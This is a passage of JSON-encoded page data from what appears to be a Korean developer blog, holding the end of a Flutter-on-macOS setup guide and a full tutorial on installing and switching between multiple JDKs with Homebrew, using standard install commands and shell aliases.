class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 안드로이드 개발을 위해\n\n- 브라우저를 통해 Android Studio를 다운로드하여 설치하세요.\n\n- 해당 링크로 이동하세요: https://developer.android.com/studio\n\n2. 설치한 후에 Android Studio의 SDK 매니저로 이동하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n3. SDK Tools 탭 아래로 이동하여 SDK 명령줄 도구를 활성화하세요. 적용 버튼을 눌러주세요.\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_1.png)\n\n4. 터미널로 돌아가서 라이센스를 수락하는 명령어를 실행하세요.\n\n```js\nflutter doctor --android-licenses\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n5. Flutter doctor를 다시 실행하여 설정이 제대로 되었는지 확인해보세요.\n\n6. Android Emulator를 설정하세요.\n\n   - Android Emulator는 이미 Android Studio에 포함되어 있습니다. 필요한 것은 여기에 나와 있는 단계를 따르는 것 뿐입니다: macOS에서 Flutter Android 앱 빌드 시작하기\n\n   - 참고: 링크의 1단계에서 VM 가속기는 더 이상 MacOS에서 지원되지 않음을 유념해주세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n안녕하세요! 안드로이드 에뮬레이터를 설정하면 구성에 따라 가상 안드로이드 장치가 표시됩니다. 이 에뮬레이터에서는 플러터 앱을 실행할 수 있어요.\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_2.png)\n\n# iOS 개발을 위해\n\n개발 도구를 설치하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- Xcode (버전 15 이상) — 네이티브 Swift 또는 ObjectiveC 코드를 디버그하고 컴파일합니다.\n\na. MacBook에서 앱 스토어를 열고 Xcode를 검색하세요.\n\nb. 그런 다음 \"get\"과 \"install\" 버튼을 클릭하세요. 이 작업을 계속하려면 Apple ID로 로그인해야 합니다. 설치에는 시간이 소요될 수 있습니다.\n\nc. 터미널에서 이 라인을 실행하세요. 이렇게 하면 명령줄 도구가 설치된 Xcode 버전을 사용하도록 구성됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nsudo sh -c 'xcode-select -s /Applications/Xcode.app/Contents/Developer && xcodebuild -runFirstLaunch'\n```\n\n터미널에서 “agree”를 입력하라는 안내가 표시됩니다.\n\nc. 터미널에서 다음 줄을 실행하세요. xcode 라이선스 동의서에 서명하십시오.\n\n```js\nsudo xcodebuild -license\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n터미널에서 \"동의\"를 입력하라는 프롬프트가 표시될 것입니다.\n\n2. 코코아팟 (1.13 또는 그 이상) - 네이티브 앱에서 플러터 플러그인을 컴파일하는 데 사용됩니다.\n\n- 설치하려면 터미널에서 다음 줄을 실행하세요.\n\n```js\nsudo gem install cocoapods\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n3. IOS 시뮬레이터 — 플러터 앱을 가상 IOS에서 표시합니다.\n\na. IOS 시뮬레이터 설치하기 — 시간이 걸릴 수 있습니다\n\n```js\nxcodebuild -downloadPlatform iOS\n```\n\nb. 시뮬레이터 실행하기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nopen -a Simulator\n```\n\n심레이터를 실행하면 가상 아이폰이 표시되는 창 또는 팝업이 열립니다.\n\n<img src=\"/assets/img/2024-05-23-SettingupFlutterforMacOS_3.png\" />\n\n# 보너스:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n디버그하는 방법을 알려드릴게요!\n\n- VSCode에서는 flutter 애플리케이션을 디버그하기 위해 개발자 도구로 이동할 수 있습니다. cmd + Shift + P를 누르고 \"Flutter: Open DevTools\"를 입력하면 디버깅에 사용할 수 있는 개발 도구 목록이 표시됩니다:\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_4.png)\n\n출처:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- [https://docs.flutter.dev/get-started/install/macos](https://docs.flutter.dev/get-started/install/macos)\n","ogImage":{"url":"/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png"},"coverImage":"/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png","tag":["Tech"],"readingTime":7},{"title":"맥OS에서 여러 JDK를 설치하고 전환하는 방법","description":"","date":"2024-05-23 15:17","slug":"2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS","content":"\n![JDK installation on macOS](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png)\n\n모든 운영 체제에는 macOS를 포함한 사전 설치된 JDK가 없습니다. 이 게시물에서는 macOS에 여러 JDK를 수동으로 설치하고 관리하는 방법을 살펴보겠습니다.\n\nmacOS에서 소프트웨어를 설치하는 잘 알려진 과정은 앱 아이콘을 클릭하거나 앱 아이콘을 Applications 폴더로 끌어다 놓는 것입니다. 이는 모든 설치 세부 정보를 멋진 앱 아이콘과 진행중인 바 아래에 숨깁니다.\n\n그러나 우리 개발자들은 로그를 보고 명령줄 도구를 사용하는 것을 좋아합니다. 이를 위해 Linux 배포판은 yum이나 apt-get과 같은 패키지 관리자를 사용합니다. 그러나 모든 것이 Apple로 이어지듯이 가장 일반적인 무료 소프트웨어는 macOS에서 작동하지 않습니다. 여기서 HomeBrew가 구원의 역할을 합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# HomeBrew\n\n도구의 홈페이지에 따르면,\n\n```js\nmacOS를 위한 누락 된 패키지 관리자입니다.\nHomebrew는 macOS에 포함되지 않은 UNIX 도구를 설치하는 가장 쉽고 유연한 방법입니다.\n```\n\nHomebrew를 사용하면 명령 줄을 통해 소프트웨어를 설치 할 수 있으며 로그에서 많은 설치 정보를 볼 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# Homebrew 설치하기\n\n맥OS에 Homebrew를 설치하려면 맥OS의 Terminal 또는 iTerm 애플리케이션을 열고 아래 명령어를 실행하세요.\n\n```js\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n이 작업이 완료되면 homebrew를 사용하여 사용 가능한 formulae 또는 cask를 한 줄로 설치할 수 있습니다. `brew install xxxx` 또는 `brew install --cask xxxx`와 같은 명령을 사용하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 다양한 JDK 버전 설치하기\n\n먼저, Homebrew를 사용하여 사용 가능한 Java 버전을 찾아보겠습니다. 다음 명령어를 사용해주세요.\n\n```bash\nbrew search --formulae java\n```\n\n아래에서 확인할 수 있듯이, java11과 java만 사용 가능합니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_1.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n더 오래된 버전을 원하시면, openjdk.java 및 java11을 openjdk 및 openjdk@11의 별명으로 사용하여 검색할 수 있습니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_2.png)\n\n이제 우리가 공식 이름을 알았으니, 하나의 명령어로 서로 다른 JDK를 설치할 수 있습니다. 최신 버전 및 java11을 설치해 보겠습니다.\n\n터미널 또는 iTerm에 다음 2개의 명령어를 차례대로 실행해 주세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nbrew install openjdk\nbrew install openjdk@11\n```\n\n# 일부 수동 설정\n\n이제 우리 Mac에는 자바 17과 자바 11이 모두 설치되어 있습니다.\nMac 프로그램에서 어떤 것을 사용할지 확인해 보겠습니다.\n\n- 어떤 기기에서든 현재 자바 버전을 확인하는 가장 쉬운 방법은\n  java -version을 사용하는 것입니다.\n- macOS에 설치된 모든 자바 버전을 확인할 수도 있습니다. java_home /usr/libexec/java_home -V를 사용하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그러나 위 2개의 명령어를 시도하면 다음 출력이 나옵니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_3.png\" />\n\n어떤 이유에서인지 macOS는 Homebrew로 설치한 Java를 감지하지 못합니다. 이것은 Homebrew를 사용하여 패키지를 설치할 때 매번 나타나는 문제입니다.\n\n- 패키지를 패키지 자체 디렉토리에 설치합니다.\n  M1-Mac의 경우 /opt/homebrew/Cellar에\n  Intel Mac의 경우 /usr/local/Cellar에\n- /opt/homebrew/opt 아래에 심볼릭 링크도 생성합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_4.png\" />\n\n하지만 \\*nix 시스템은 /usr/bin/java, /usr/lib/jvm 및 /usr/local/bin/java에서 Java를 찾습니다. Apple의 모든 것들과 마찬가지로 macOS는 다릅니다. Java를 /Library/Java/JavaVirtualMachines/에서 찾습니다.\n\n이러한 JDK 설치법은 /Library/Java/JavaVirtualMachines/ 폴더 아래 필요한 softlink를 설정할 수 있었을 것입니다. 그러나 디자인상 이러한 JDK 설치법은 keg-only로 유지됩니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_5.png\" />\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 정보는 설치 로그에도 있습니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_6.png)\n\n따라서 Mac 프로그램에서 설치된 Java를 감지하려면 해당 폴더에 몇 가지 소프트 링크를 만들어야 합니다. 설치 로그에 제공된 명령을 그대로 복사하여 붙여넣으십시오.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_7.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 섹션의 시작 부분에서 실패한 명령을 실행하려고 하면 아래와 같은 출력이 나타납니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_8.png\" />\n\n이제 macOS에서 감지된 2개의 JDK를 설치했으므로 두 가지 간을 빠르게 전환하는 방법을 살펴보겠습니다.\n\nJava의 버전을 한 가지만 설치하는 경우에는 이미 끝났습니다. 그러나 Mac에 여러 가지 다른 버전의 Java를 설치하고자 하는 경우 위의 단계대로 각각 설치하고 아래 단계에 따라 그 사이를 전환할 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# JDK 전환하기 (JAVA_HOME 및 java_home)\n\nJAVA_HOME은 Java 프로그램이 Java 위치를 선택하도록 하는 환경 변수입니다. 따라서 다양한 Java 버전 간에 전환하려면 JAVA_HOME 값을 다른 위치로 변경해야 합니다.\n\n또한 /usr/libexec/java_home 유틸리티가 있습니다. 이를 사용하여 다양한 버전 간에 전환합니다.\n\n우리의 설치에서는 다음과 같이 매개 변수 -v (소문자 v)가 우리에게 제공하는 내용입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n`\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_9.png)\n\n- 이 명령어의 출력을 활용하여 JAVA_HOME을 아래와 같이 설정할 수 있습니다.\n  export JAVA_HOME=`/usr/libexec/java_home -v 17`\n- 그러나 명령어를 입력하는 것이 조금 길 수 있습니다. 그래서 전체 명령어를 대체할 수 있는 한 단어의 별칭을 만들어 보겠습니다.\n  alias java-17=”export JAVA_HOME=`/usr/libexec/java_home -v 17`”\n- 또한, 새 터미널을 열 때마다 이러한 별칭이 사용 가능하도록 해야 합니다. 이를 위해 ~/.zshrc 파일에 추가해야 합니다. ~/.zshrc 파일에 다음과 같이 2개의 별칭을 추가하세요. ~/.zshrc 파일이 존재하지 않는 경우, 파일을 생성하세요.\n\n```js\nalias java-17=”export JAVA_HOME=`/usr/libexec/java_home -v 17`; java -version”\nalias java-11=”export JAVA_HOME=`/usr/libexec/java_home -v 11`; java -version”\n```\n\n모두 완료되었습니다.\n원하는 때마다 터미널이나 iTerm에서 java-11 또는 java-17을 입력하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_10.png)\n\n# TL;DR (명령어 간단 요약)\n\n설명이 아닌 단계만 원하는 분들을 위해 간단한 단계를 안내합니다.\n\n- 시스템에 Homebrew가 없는 경우 Homebrew를 설치하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n- Homebrew 및 openjdk를 사용하여 필요한 만큼 JDK를 설치하세요.\n\n```js\nbrew install openjdk@XX\n```\n\n- MAC에서 JDK에 액세스할 수 있도록 하려면, 소프트 링크나 실제 폴더를 /Library/Java/JavaVirtualMachines/에 추가하세요. 소프트 링크를 사용하려면 아래 명령어를 사용하세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n$ sudo ln -sfn /opt/homebrew/opt/openjdkXXX/libexec/openjdkXXX.jdk /Library/Java/JavaVirtualMachines/openjdkXXX.jdk\n\n- Add one more alias under `~/.zshrc` to quickly switch between JDK\n\nalias java-XX=\"export JAVA_HOME=\\`/usr/libexec/java_home -v XX\\`; java -version\"\n","ogImage":{"url":"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png"},"coverImage":"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png","tag":["Tech"],"readingTime":9}],"page":"68","totalPageCount":119,"totalPageGroupCount":6,"lastPageGroup":20,"currentPageGroup":3},"__N_SSG":true}